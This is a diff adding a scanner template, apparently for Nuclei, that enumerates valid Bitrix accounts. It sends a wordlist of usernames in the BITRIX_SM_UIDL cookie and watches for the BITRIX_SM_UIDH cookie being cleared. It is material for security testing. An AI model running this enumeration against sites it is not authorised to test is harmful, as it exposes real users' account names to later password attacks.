@@ -1,0 +1,48 @@
+id: bitrix-account-enumeration-uidh
+
+info:
+  name: Bitrix Account Enumeration via BITRIX_SM_UIDH
+  author: JhonnyBonny
+  severity: medium
+  description: |
+    Bitrix reveals whether a login exists by clearing BITRIX_SM_UIDH when
+    BITRIX_SM_UIDL is set to a valid username. Enumerates accounts using a
+    Unix / common-service username wordlist.
+  reference:
+    - https://github.com/cr1f/writeups/blob/main/attacking_bitrix.pdf
+  metadata:
+    max-request: 250
+  tags: bitrix,bitrix24,enum,exposure
+
+http:
+  - raw:
+      - |
+        GET /bitrix/tools/upload.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Cookie: BITRIX_SM_UIDL={{username}}; BITRIX_SM_UIDH=1;
+
+    payloads:
+      username: wordlists/unix_users.txt
+
+    attack: batteringram
+    threads: 10
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "BITRIX_SM_UIDH=deleted"
+
+      - type: status
+        status:
+          - 200
+          - 403
+          - 500
+        condition: or
+
+    extractors:
+      - type: dsl
+        dsl:
+          - '"valid_login: " + username'
